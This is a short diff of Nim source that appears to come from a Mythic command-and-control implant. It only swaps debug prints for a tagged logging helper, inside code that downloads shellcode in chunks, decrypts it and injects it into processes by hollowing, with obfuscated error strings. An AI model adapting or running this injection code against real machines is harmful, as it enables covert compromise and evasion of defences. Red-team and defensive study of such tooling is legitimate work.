@@ -342,9 +342,9 @@ proc injectHollow*(taskId: string, params: JsonNode): JsonNode =
       # Non-cached: parse full args (uuid required)
       let args = to(params, InjectHollowArgs)
       
-      debug &"[DEBUG] Inject hollow: {args.shellcode_name}"
-      debug &"[DEBUG] Technique: {args.technique}"
-      debug &"[DEBUG] UUID for download: {args.uuid}"
+      debugLog "inject_hollow", &"Inject hollow: {args.shellcode_name}"
+      debugLog "inject_hollow", &"Technique: {args.technique}"
+      debugLog "inject_hollow", &"UUID for download: {args.uuid}"
       
       # Return initial response - request the file from Mythic
       return %*{
@@ -375,7 +375,7 @@ proc processInjectHollowChunk*(taskId: string, params: JsonNode, chunkData: stri
       for b in decodedChunk:
         fileData.add(cast[byte](b))
       
-      debug &"[DEBUG] Inject hollow: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
+      debugLog "inject_hollow", &"Inject hollow: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
       
       # If more chunks remain, request the next one
       if currentChunk < totalChunks:
@@ -410,14 +410,14 @@ proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode
       var finalShellcode = shellcode
       # Decrypt shellcode if encryption is specified
       if args.encryption != "" and args.encryption != "none":
-        debug &"[*] Decrypting shellcode with {args.encryption}..."
+        debugLog "inject_hollow", &"Decrypting shellcode with {args.encryption}..."
         try:
           decryptPayload(finalShellcode, args.encryption, args.key, args.iv, args.nonce)
-          debug &"[+] Decryption successful ({finalShellcode.len} bytes)"
+          debugLog "inject_hollow", &"Decryption successful ({finalShellcode.len} bytes)"
         except Exception as e:
           return mythicError(taskId, obf("Decryption failed: ") & e.msg)
       
-      debug &"[DEBUG] Injecting shellcode ({finalShellcode.len} bytes) via {args.technique}"
+      debugLog "inject_hollow", &"Injecting shellcode ({finalShellcode.len} bytes) via {args.technique}"
       
       var injResult: tuple[success: bool, error: string]
       case args.technique.toLower():
